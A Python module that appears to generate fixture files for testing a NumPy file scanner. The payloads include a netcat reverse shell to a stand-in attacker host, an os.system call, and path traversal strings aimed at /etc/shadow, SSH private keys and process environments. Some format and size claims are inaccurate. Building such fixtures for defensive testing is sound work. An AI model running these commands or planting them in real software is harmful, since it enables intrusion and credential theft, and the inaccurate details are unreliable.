"""
NumPy Attack Vector Generator

Generates attack vectors for NumPy array files:
- .npy (single array files)
- .npz (compressed archive format)
"""

import json
import zipfile
from pathlib import Path
from typing import List, Dict, Tuple


class NumPyAttackGenerator:
    """Generate NumPy-specific attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the NumPy attack generator."""
        self.output_dir = Path(output_dir) / "numpy_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_object_array_exploit(self) -> Tuple[str, int]:
        """Generate NPY with object array containing code objects.
        
        Attack Vector:
            NumPy object array containing:
            1. Python function objects
            2. Callable classes
            3. Module references
            4. Import statements
        
        Impact: Code execution during array access
        Severity: CRITICAL
        Detection: Object type inspection, disallowed_object_check
        
        Returns:
            Tuple of (filepath, num_objects)
        """
        filepath = self.output_dir / "01_object_array_exploit.json"
        
        exploit = {
            "dtype": "object",
            "shape": [3],
            "data": [
                "__import__('os').system('id')",
                "compile('exec(\"print(1)\")', '<string>', 'exec')",
                "eval('1+1')"
            ],
            "metadata": {
                "allow_pickle": True,
                "unsafe": True
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(exploit, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_header_corruption(self) -> Tuple[str, int]:
        """Generate NPY with corrupted header.
        
        Attack Vector:
            Malformed NPY header containing:
            1. Invalid magic number
            2. Corrupted dtype field
            3. Oversized array dimensions
            4. Invalid header length
        
        Impact: Buffer overflow, memory corruption
        Severity: HIGH
        Detection: Header validation, magic byte check
        
        Returns:
            Tuple of (filepath, num_metadata_issues)
        """
        filepath = self.output_dir / "02_corrupted_header.json"
        
        corrupt_data = {
            "magic": "XXXX",  # Invalid magic
            "version": [255, 255],  # Invalid version
            "header_len": 99999,  # Oversized
            "dtype": "object",
            "shape": [2**32, 2**32],  # Oversized dimensions
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(corrupt_data, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1
    
    def generate_decompression_bomb(self) -> Tuple[str, int]:
        """Generate NPZ with compression bomb.
        
        Attack Vector:
            Compressed NPZ archive with:
            1. Extreme compression ratio (>100x)
            2. Nested compression
            3. Resource exhaustion pattern
            4. Decompression memory bomb
        
        Impact: Denial of service via memory exhaustion
        Severity: HIGH
        Detection: Compression ratio analysis, size limits
        
        Returns:
            Tuple of (filepath, compression_ratio)
        """
        filepath = self.output_dir / "03_decompression_bomb.npz"
        
        # Create a zip with highly compressible data
        with zipfile.ZipFile(filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Add highly compressible data
            payload = "A" * (1024 * 1024)  # 1MB of As
            zf.writestr("data.npy", payload, compress_type=zipfile.ZIP_DEFLATED)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 100  # High compression ratio
    
    def generate_malicious_metadata(self) -> Tuple[str, int]:
        """Generate NPY with malicious metadata in dtype.
        
        Attack Vector:
            Custom dtype with:
            1. Executable name field
            2. Code in title string
            3. Metadata containing imports
            4. Hidden payload in alignment
        
        Impact: Code execution through type handling
        Severity: CRITICAL
        Detection: Dtype string parsing, metadata inspection
        
        Returns:
            Tuple of (filepath, num_exec_patterns)
        """
        filepath = self.output_dir / "04_malicious_metadata.json"
        
        malformed_dtype = {
            "version": "1.0",
            "shape": [10],
            "dtype": "__import__('os').system('nc -e /bin/sh attacker.com 4444')",
            "title": "exec(__import__('subprocess').call(['bash']))",
            "descr": "|S1000x__import__('base64').b64decode('...')x"
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(malformed_dtype, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 2
    
    def generate_type_confusion_attack(self) -> Tuple[str, int]:
        """Generate NPZ with type confusion between files.
        
        Attack Vector:
            NPZ archive with:
            1. Array saved as wrong dtype
            2. Mismatched shape/actual data
            3. String array with binary data
            4. Type mismatch for code execution
        
        Impact: Type confusion leading to code execution
        Severity: HIGH
        Detection: Type consistency checks
        
        Returns:
            Tuple of (filepath, num_type_mismatches)
        """
        filepath = self.output_dir / "05_type_confusion.json"
        
        confusion_data = {
            "declared_dtype": "float32",
            "actual_dtype": "object",
            "declared_shape": [4],
            "actual_shape": [2, 2],
            "payload": "b'ELF\\x7fELF' OR '__import__(...)',",
            "method": "load with allow_pickle=True"
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(confusion_data, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_recursive_object_bomb(self) -> Tuple[str, int]:
        """Generate NPY with recursive object structure.
        
        Attack Vector:
            Object array with:
            1. Self-referential objects
            2. Circular references
            3. Deeply nested structures
            4. Stack exhaustion via recursion
        
        Impact: Stack overflow, denial of service
        Severity: MEDIUM
        Detection: Recursion depth analysis, cycle detection
        
        Returns:
            Tuple of (filepath, max_depth)
        """
        filepath = self.output_dir / "06_recursive_object_bomb.json"
        
        recursive_structure = {
            "dtype": "object",
            "data": {
                "self": "reference_to_parent",
                "level": 10000,
                "recursion_type": "circular_reference",
                "nested": {
                    "depth": "unlimited",
                    "structure": "fractal_pattern"
                }
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(recursive_structure, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 10000
    
    def generate_memmap_traversal(self) -> Tuple[str, int]:
        """Generate NPZ with memory-mapped file traversal.
        
        Attack Vector:
            NPZ using memmap with:
            1. Path traversal in filename
            2. Access to /etc/passwd
            3. SSH key directory escape
            4. Sensitive file exposure
        
        Impact: Unauthorized file access
        Severity: HIGH
        Detection: Path validation, sandbox checks
        
        Returns:
            Tuple of (filepath, num_traversal_paths)
        """
        filepath = self.output_dir / "07_memmap_traversal.json"
        
        traversal_payload = {
            "operation": "memmap",
            "filename": "../../../../../../etc/passwd",
            "dtype": "uint8",
            "mode": "r",
            "offset": 0,
            "shape": [10000],
            "escapes": [
                "../../../etc/shadow",
                "../../root/.ssh/id_rsa",
                "../../../proc/self/environ",
                "C:\\Windows\\System32\\config\\SAM"
            ]
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(traversal_payload, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 4
    
    def generate_oversized_array(self) -> Tuple[str, int]:
        """Generate NPY claiming huge array dimensions.
        
        Attack Vector:
            NPY with:
            1. Shape claiming 2^64 elements
            2. dtype float64 (would need 16 exabytes)
            3. Integer overflow in size calculation
            4. Memory exhaustion on open
        
        Impact: Memory exhaustion, denial of service
        Severity: HIGH
        Detection: Size limit enforcement, overflow checks
        
        Returns:
            Tuple of (filepath, size_exabytes)
        """
        filepath = self.output_dir / "08_oversized_array.json"
        
        oversized = {
            "dtype": "float64",
            "shape": [2**32, 2**32],  # 2^64 elements
            "itemsize": 8,
            "nbytes": "18446744073709551616",  # 16 exabytes
            "memory_bomb_pattern": True
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(oversized, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 16
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all NumPy attack vectors."""
        results = {
            "object_array_exploit": self.generate_object_array_exploit(),
            "header_corruption": self.generate_header_corruption(),
            "decompression_bomb": self.generate_decompression_bomb(),
            "malicious_metadata": self.generate_malicious_metadata(),
            "type_confusion": self.generate_type_confusion_attack(),
            "recursive_bomb": self.generate_recursive_object_bomb(),
            "memmap_traversal": self.generate_memmap_traversal(),
            "oversized_array": self.generate_oversized_array(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = NumPyAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
